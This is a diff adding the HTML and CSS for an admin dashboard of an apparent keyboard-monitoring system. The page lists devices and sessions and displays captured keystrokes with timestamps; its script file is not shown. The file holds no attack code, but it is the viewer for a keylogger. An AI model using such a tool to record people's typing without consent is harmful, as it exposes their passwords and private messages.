@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard - Keyboard Monitor</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #0a0a0f;
+      color: #f1f5f9;
+      min-height: 100vh;
+      padding: 40px;
+    }
+
+    .container { max-width: 1200px; margin: 0 auto; }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 32px;
+      padding-bottom: 24px;
+      border-bottom: 1px solid #2a2a3a;
+    }
+
+    h1 { font-size: 24px; }
+
+    .subtitle { color: #64748b; margin-top: 4px; }
+
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 16px;
+      margin-bottom: 32px;
+    }
+
+    .stat-card {
+      background: linear-gradient(135deg, #1a1a25, #12121a);
+      border: 1px solid #2a2a3a;
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .stat-value {
+      font-size: 28px;
+      font-weight: 700;
+      color: #3b82f6;
+    }
+
+    .stat-label {
+      font-size: 11px;
+      color: #64748b;
+      text-transform: uppercase;
+      margin-top: 4px;
+    }
+
+    .section {
+      margin-bottom: 32px;
+    }
+
+    .section-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+
+    .section-header h2 {
+      font-size: 16px;
+      color: #f1f5f9;
+    }
+
+    .devices-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 16px;
+    }
+
+    .device-card {
+      background: #15151f;
+      border: 1px solid #2a2a3a;
+      border-radius: 12px;
+      padding: 16px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .device-card:hover {
+      border-color: #3b82f6;
+      transform: translateY(-2px);
+    }
+
+    .device-id {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: #3b82f6;
+      background: #0a0a0f;
+      padding: 6px 10px;
+      border-radius: 6px;
+      margin-bottom: 12px;
+      display: inline-block;
+    }
+
+    .device-stats {
+      display: flex;
+      gap: 16px;
+      font-size: 13px;
+      color: #94a3b8;
+    }
+
+    .device-stat-value {
+      color: #f1f5f9;
+      font-weight: 600;
+    }
+
+    .back-btn {
+      background: #1a1a25;
+      border: 1px solid #2a2a3a;
+      color: #f1f5f9;
+      padding: 8px 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 13px;
+    }
+
+    .back-btn:hover { background: #2a2a3a; }
+
+    .sessions-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .session-card {
+      background: #15151f;
+      border: 1px solid #2a2a3a;
+      border-radius: 12px;
+      padding: 16px 20px;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      transition: all 0.2s ease;
+    }
+
+    .session-card:hover { border-color: #3b82f6; }
+
+    .session-time { font-size: 14px; }
+
+    .session-meta { font-size: 12px; color: #64748b; margin-top: 4px; }
+
+    .session-keys { text-align: right; }
+
+    .session-key-count { font-size: 20px; font-weight: 700; color: #3b82f6; }
+
+    .session-key-label { font-size: 11px; color: #64748b; }
+
+    .keystrokes-display {
+      background: #15151f;
+      border: 1px solid #2a2a3a;
+      border-radius: 12px;
+      padding: 20px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 16px;
+      line-height: 2;
+      max-height: 400px;
+      overflow-y: auto;
+      word-break: break-all;
+    }
+
+    .key-item {
+      display: inline-block;
+      padding: 4px 8px;
+      margin: 2px;
+      background: #1a1a25;
+      border-radius: 4px;
+      border: 1px solid #2a2a3a;
+    }
+
+    .key-item.special {
+      background: #3b82f6;
+      color: white;
+      border-color: #3b82f6;
+    }
+
+    .key-timestamp {
+      display: block;
+      font-size: 12px;
+      color: #64748b;
+      margin: 16px 0 8px;
+      padding-top: 8px;
+      border-top: 1px solid #2a2a3a;
+    }
+
+    .loading { text-align: center; color: #64748b; padding: 40px; }
+
+    .btn {
+      padding: 10px 20px;
+      border-radius: 8px;
+      border: none;
+      font-size: 14px;
+      cursor: pointer;
+      background: #3b82f6;
+      color: white;
+    }
+
+    .btn:hover { background: #2563eb; }
+
+    .btn-danger {
+      background: #ef4444;
+    }
+
+    .btn-danger:hover { background: #dc2626; }
+
+    #clearBtn { margin-top: 16px; }
+
+    .hidden { display: none !important; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div>
+        <h1>Admin Dashboard</h1>
+        <p class="subtitle" id="headerSubtitle">All monitored keyboard activity</p>
+      </div>
+      <button class="back-btn hidden" id="backBtn">Back to Devices</button>
+    </div>
+
+    <div class="stats" id="statsSection">
+      <div class="stat-card">
+        <div class="stat-value" id="totalKeystrokes">0</div>
+        <div class="stat-label">Total Keystrokes</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value" id="totalDevices">0</div>
+        <div class="stat-label">Devices</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value" id="totalSessions">0</div>
+        <div class="stat-label">Sessions</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value" id="todayKeystrokes">0</div>
+        <div class="stat-label">Today</div>
+      </div>
+    </div>
+
+    <!-- Devices Section -->
+    <div class="section" id="devicesSection">
+      <div class="section-header">
+        <h2>Devices</h2>
+        <button class="btn" id="refreshBtn">Refresh</button>
+      </div>
+      <div class="devices-grid" id="devicesGrid">
+        <div class="loading">Loading devices...</div>
+      </div>
+    </div>
+
+    <!-- Sessions Section -->
+    <div class="section hidden" id="sessionsSection">
+      <div class="section-header">
+        <h2 id="sessionsTitle">Sessions</h2>
+      </div>
+      <div class="sessions-list" id="sessionsList">
+        <div class="loading">Loading sessions...</div>
+      </div>
+    </div>
+
+    <!-- Keystrokes Section -->
+    <div class="section hidden" id="keystrokesSection">
+      <div class="section-header">
+        <h2 id="keystrokesTitle">Keystrokes</h2>
+      </div>
+      <div class="keystrokes-display" id="keystrokesDisplay">
+        <div class="loading">Loading keystrokes...</div>
+      </div>
+    </div>
+
+    <button class="btn btn-danger" id="clearBtn">Clear All Data</button>
+  </div>
+
+  <script src="admin.js"></script>
+</body>
+</html>
